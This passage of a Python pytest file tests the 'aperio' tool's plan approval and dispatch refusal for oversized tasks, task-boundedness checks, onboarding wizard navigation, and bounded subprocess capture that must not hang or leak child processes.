    apdir = tmp_path / ".aperio"
    create_plan(apdir, _valid_plan())

    plan_path = apdir / "plan.json"
    document = json.loads(plan_path.read_text(encoding="utf-8"))
    document["tasks"][0]["title"] = "Implement the Hero Section"
    document["tasks"][0]["objective"] = "Implement the Hero Section"
    document["tasks"][0]["deliverables"] = ["hero"]
    document["tasks"][0]["acceptance_criteria"] = ["hero renders"]
    plan_path.write_text(json.dumps(document, indent=2), encoding="utf-8")

    with pytest.raises(StateError):
        approve_plan(apdir)
    assert json.loads(plan_path.read_text(encoding="utf-8"))["approval"]["status"] != "approved"


# --- execution eligibility -------------------------------------------------

def test_dispatch_refuses_hero_section_plan(tmp_path):
    import json

    from aperio.planstore import approve_plan, create_plan
    from aperio.project import init_project
    from aperio.runtime import dispatch_task

    init_project(str(tmp_path))
    apdir = tmp_path / ".aperio"
    create_plan(apdir, _valid_plan())
    approve_plan(apdir)

    plan_path = apdir / "plan.json"
    document = json.loads(plan_path.read_text(encoding="utf-8"))
    document["tasks"][0]["title"] = "Implement the Hero Section"
    document["tasks"][0]["objective"] = "Implement the Hero Section"
    document["tasks"][0]["deliverables"] = ["hero"]
    document["tasks"][0]["acceptance_criteria"] = ["hero renders"]
    plan_path.write_text(json.dumps(document, indent=2), encoding="utf-8")

    with pytest.raises(StateError, match="execution refused"):
        dispatch_task(apdir, "TASK-001", adapter_id="manual", config=None,
                      authorize_exec=False)
    assert (apdir / "executions.json").exists() is False


def test_goal_with_one_oversized_hero_task_is_blocked():
    from aperio.bounded_tasks import assess_goal_boundedness

    goal = _goal_with_tasks([_declared_task("t1", "Implement the Hero Section")])
    assert assess_goal_boundedness(goal).blocked is True


# ---------------------------------------------------------------------------
# Codex review finding (P2): wizard /back must re-prompt, not overwrite.
# ---------------------------------------------------------------------------

def test_wizard_back_does_not_overwrite_the_previous_answer(tmp_path):
    from aperio import wizard
    from aperio.onboarding_session import read_session

    proj = tmp_path / "proj"
    proj.mkdir()
    result = wizard.run(
        str(proj),
        stdin=_TTY("1\nwebsite\n/back\nmobile app\n/quit\n"),
        stdout=_TTY(""),
        request_approval=lambda message: True,
    )
    answers = read_session(proj / ".aperio").get("answers", {})
    assert "project.category" in answers
    # The genuine answer must survive (or be replaced by the operator's own
    # replacement) — never be silently swapped for a placeholder.
    assert answers["project.category"]["answer"] != "Not sure yet"
    assert answers["project.category"]["answer"] in {"website", "mobile app"}
    assert result.cancelled is True


class _RecordingTTY(_TTY):
    def __init__(self, text=""):
        super().__init__(text)
        self.written = []

    def write(self, s):
        self.written.append(s)
        return len(s)


def test_wizard_back_shows_the_category_question_again(tmp_path):
    from aperio import wizard

    proj = tmp_path / "proj"
    proj.mkdir()
    out = _RecordingTTY("")
    wizard.run(
        str(proj),
        stdin=_TTY("1\nwebsite\n/back\nmobile app\n/quit\n"),
        stdout=out,
        request_approval=lambda message: True,
    )
    text = "".join(out.written)
    prompt = "[meta] Which of these best describes this project?"
    assert text.count(prompt) >= 2, "the previous question was not re-offered"
    assert "Going back to the previous question" in text


def test_withdraw_answer_removes_only_that_answer(tmp_path):
    from aperio import onboarding
    from aperio.onboarding_session import read_session

    ws = tmp_path / "p"
    ws.mkdir()
    onboarding.confirm_initialization(str(ws))
    apdir = ws / ".aperio"
    onboarding.record_intent(apdir, "continue")
    onboarding.answer(apdir, "project.category", "website")
    onboarding.answer(apdir, "foundation.goal", "ship a garden site")
    onboarding.withdraw(apdir, "foundation.goal")
    answers = read_session(apdir)["answers"]
    assert "foundation.goal" not in answers
    assert answers["project.category"]["answer"] == "website"


# ---------------------------------------------------------------------------
# Codex review finding (P2): a descendant holding the pipes must not hang.
# ---------------------------------------------------------------------------

def test_run_captured_does_not_hang_when_a_descendant_holds_the_pipe(tmp_path):
    import time

    from aperio.safeproc import run_captured

    script = tmp_path / "spawner.py"
    script.write_text(
        "import subprocess, sys\n"
        "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)'])\n"
        "print('child done', flush=True)\n",
        encoding="utf-8",
    )
    started = time.monotonic()
    result = run_captured(
        [sys.executable, str(script)],
        timeout_seconds=0.2,
        capture_limit=65536,
        drain_grace_seconds=1.0,
    )
    elapsed = time.monotonic() - started
    assert elapsed < 8.0, f"bounded capture hung for {elapsed:.1f}s"
    assert result["stdout"] == "child done\n"


# ---------------------------------------------------------------------------
# Codex re-review findings (P2): bounded changes that name a product, and
# native-plan tasks whose scope sits in acceptance_criteria.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("objective", [
    "Fix a typo in the website",
    "Update the website footer link",
    "Fix a typo in the API docs",
    "Correct the docstring in the service module",
])
def test_bounded_change_that_names_a_product_stays_bridgeable(objective):
    """A small operation must not be blocked just because it names where it goes."""
    from aperio.bounded_tasks import assess_goal_boundedness
    from aperio.planbridge import plan_proposal_from_goal

    goal = _goal(objective)
    assert assess_goal_boundedness(goal).blocked is False
    plan = plan_proposal_from_goal(goal)
    assert plan["plan_input"]["tasks"][0]["id"] == "TASK-001"


@pytest.mark.parametrize("objective", [
    "Build an entire website",
    "Add CMS-backed Hero content",
    "Rewrite the website",
    "Fix a typo and redesign the whole site",
])
def test_breadth_still_blocks_bounded_wording(objective):
    from aperio.bounded_tasks import assess_goal_boundedness

    assert assess_goal_boundedness(_goal(objective)).blocked is True


def _plan_with_scope_in_acceptance(criterion):
    plan = _valid_plan([{
        "id": "TASK-001", "title": "Implement component",
        "objective": "Deliver component", "deliverables": ["x"],
        "acceptance_criteria": [criterion], "depends_on": [],
    }])
    return plan


def test_plan_create_reads_acceptance_criteria_for_scope():
    """A native plan task stores criteria under acceptance_criteria, not
    completion_criteria: hiding scope there must not bypass the check."""
    from aperio.planmodel import validate_plan_input

    with pytest.raises(ValidationError):
        validate_plan_input(
            _plan_with_scope_in_acceptance("Build the entire website including all pages")
        )


def test_plan_approve_and_dispatch_read_acceptance_criteria(tmp_path):
    import json

    from aperio.planstore import approve_plan, create_plan
    from aperio.project import init_project
    from aperio.runtime import dispatch_task

    init_project(str(tmp_path))
    apdir = tmp_path / ".aperio"
    create_plan(apdir, _valid_plan())

    plan_path = apdir / "plan.json"
    document = json.loads(plan_path.read_text(encoding="utf-8"))
    document["tasks"][0]["acceptance_criteria"] = [
        "Build the entire website including all pages"
    ]
    plan_path.write_text(json.dumps(document, indent=2), encoding="utf-8")

    with pytest.raises(StateError):
        approve_plan(apdir)

    # Force an approved stamp to prove dispatch refuses on its own.
    document["approval"] = {
        "status": "approved", "approved_revision": document["plan_version"],
        "approved_at": "2026-01-01T00:00:00Z", "approved_by": "audit",
    }
    plan_path.write_text(json.dumps(document, indent=2), encoding="utf-8")
    with pytest.raises(StateError, match="execution refused"):
        dispatch_task(apdir, "TASK-001", adapter_id="manual", config=None,
                      authorize_exec=False)


# ---------------------------------------------------------------------------
# Codex third review (P2): verification criteria are not implementation breadth.
# ---------------------------------------------------------------------------

def test_verification_criterion_does_not_make_a_bounded_task_oversized():
    from aperio.bounded_tasks import assess_task_boundeness
    from aperio.planmodel import validate_plan_input

    base = {
        "id": "TASK-001", "title": "Fix login button CSS",
        "objective": "Fix login button CSS", "deliverables": ["login.css"],
        "depends_on": [],
    }
    oversized, signals = assess_task_boundeness(base)
    assert oversized is False, signals
    with_tests = {**base, "acceptance_criteria": ["Unit tests pass"]}
    oversized, signals = assess_task_boundeness(with_tests)
    assert oversized is False, f"a test requirement must not imply breadth: {signals}"

    plan = _valid_plan([{**with_tests}])
    document = validate_plan_input(plan)
    assert document["tasks"][0]["id"] == "TASK-001"


def test_scope_hidden_in_criteria_is_still_blocked():
    """R09 must keep holding: hiding scope in criteria is not a way through."""
    from aperio.bounded_tasks import assess_task_boundeness

    task = {
        "id": "TASK-001", "title": "Implement component",
        "objective": "Deliver component", "deliverables": ["x"],
        "acceptance_criteria": ["Build the entire website including all pages"],
        "depends_on": [],
    }
    oversized, signals = assess_task_boundeness(task)
    assert oversized is True, signals

    hero = {
        "id": "TASK-001", "title": "Implement component",
        "objective": "Deliver component", "deliverables": ["x"],
        "acceptance_criteria": ["cover the entire hero section"],
        "depends_on": [],
    }
    oversized, signals = assess_task_boundeness(hero)
    assert oversized is True, signals


def test_bounded_slice_with_a_section_criterion_stays_valid():
    """A genuinely narrow task may still require the section to work."""
    from aperio.bounded_tasks import assess_task_boundeness

    task = {
        "id": "TASK-001", "title": "Build the Hero Section markup",
        "objective": "Hero Section markup", "deliverables": ["hero component"],
        "acceptance_criteria": ["the entire hero section renders correctly"],
        "depends_on": [],
    }
    oversized, signals = assess_task_boundeness(task)
    assert oversized is False, signals


# ---------------------------------------------------------------------------
# Codex fourth review (P2): test-only tasks are bounded; /back at the first
# question returns to the intent chooser.
# ---------------------------------------------------------------------------

def test_test_only_task_is_a_bounded_slice():
    from aperio.bounded_tasks import assess_task_boundeness
    from aperio.planmodel import validate_plan_input

    task = {
        "id": "TASK-001", "title": "Add unit tests for login",
        "objective": "Add unit tests for login",
        "deliverables": ["test_login.py"],
        "acceptance_criteria": ["Unit tests pass"], "depends_on": [],
    }
    oversized, signals = assess_task_boundeness(task)
    assert oversized is False, f"test-only work must be a slice: {signals}"
    assert validate_plan_input(_valid_plan([task]))["tasks"][0]["id"] == "TASK-001"


def test_back_at_the_first_question_returns_to_the_intent_chooser(tmp_path):
    from aperio import wizard
    from aperio.onboarding_session import read_session

    proj = _make_existing_project(tmp_path)
    out = _RecordingTTY("")
    wizard.run(
        str(proj),
        stdin=_TTY("1\n/back\n2\n/quit\n"),   # intent, back, different intent, quit
        stdout=out,
        request_approval=lambda message: True,
    )
    text = "".join(out.written)
    assert text.count("What would you like to do with this project?") >= 2, (
        "the intent chooser was not re-offered"
    )
    intent = read_session(proj / ".aperio")["intent"]
    assert intent == "Start a new feature or task", intent


# ---------------------------------------------------------------------------
# Codex fifth review (P2): goal assessment applies to declared decompositions;
# recovery reports agree with the task-wide retry ceiling.
# ---------------------------------------------------------------------------

def test_goal_assessment_applies_to_declared_decompositions():
    from aperio.goals import validate_goal
    from aperio.planbridge import plan_proposal_from_goal

    def goal(tasks):
        return validate_goal({
            "goal_id": "G1", "objective": "Build an entire website",
            "intended_outcome": "a site", "profile": "software",
            "deliverables": ["site"], "acceptance_criteria": ["builds"],
            "work": {"tasks": tasks},
        })

    token_task = {"id": "t1", "title": "Fix footer link",
                  "action": "fix the footer link", "deliverables": ["footer"],
                  "completion_criteria": ["tests pass"]}
    with pytest.raises(ValidationError) as exc:
        plan_proposal_from_goal(goal([token_task]))
    assert "decompos" in str(exc.value).lower()

    # A proportionate decomposition still bridges.
    full = [
        {"id": f"t{i}", "title": title, "action": title, "deliverables": [title],
         "completion_criteria": ["unit tests pass"]}
        for i, title in enumerate(["Build the navigation markup",
                                   "Build the footer markup",
                                   "Style the responsive layout"], start=1)
    ]
    proposal = plan_proposal_from_goal(goal(full))
    assert len(proposal["plan_input"]["tasks"]) == 3


def test_recovery_report_explains_the_task_wide_ceiling():
    from aperio.recovery import MAX_ATTEMPTS_PER_TASK, recovery_report, retry_gate

    runs = [
        {
            "run_id": f"run-{i}", "task_id": "T1", "status": "failed",
            "outcome": f"distinct problem {i}", "exit_code": i,
            "failure_attempt": 1, "adapter_id": "sim",
            "finished_at": f"2026-11-11T10:0{i}:00Z",
        }
        for i in range(MAX_ATTEMPTS_PER_TASK)
    ]
    with pytest.raises(StateError):
        retry_gate(runs, "T1", remediation="changed the approach materially")

    report = recovery_report(runs, "T1")
    assert report["verdict"] != "failed_runs_present", report["verdict"]
    guidance = " ".join(report["guidance"]).lower()
    assert "ceiling" in guidance and "retry" in guidance, guidance
    assert report["task_ceiling_reached"] is True


# ---------------------------------------------------------------------------
# Codex sixth review (P2): an interrupt must not leave an owned child running.
# ---------------------------------------------------------------------------

@pytest.mark.skipif(os.name != "posix", reason="process-group semantics are POSIX-only")
def test_interrupt_stops_and_reaps_the_captured_child(tmp_path):
    import signal
    import threading
    import time as _time

    from aperio.safeproc import run_captured

    pidfile = tmp_path / "child.pid"
    script = f"echo $$ > {pidfile}; exec sleep 30"

    def interrupt() -> None:
        _time.sleep(0.5)
        os.kill(os.getpid(), signal.SIGINT)

    threading.Thread(target=interrupt, daemon=True).start()
    started = _time.monotonic()
    with pytest.raises(KeyboardInterrupt):
        run_captured(["/bin/sh", "-c", script], timeout_seconds=20, capture_limit=1000)
    assert _time.monotonic() - started < 10, "the interrupt was not honoured promptly"

    child_pid = int(pidfile.read_text().strip())
    with pytest.raises(ProcessLookupError):
        os.kill(child_pid, 0)   # still alive => the interrupt leaked the child


def test_capture_preserves_the_startup_error_when_the_child_cannot_start():
    from aperio.safeproc import run_captured

    with pytest.raises(FileNotFoundError):
        run_captured(["/aperio-nonexistent"], timeout_seconds=1, capture_limit=100)
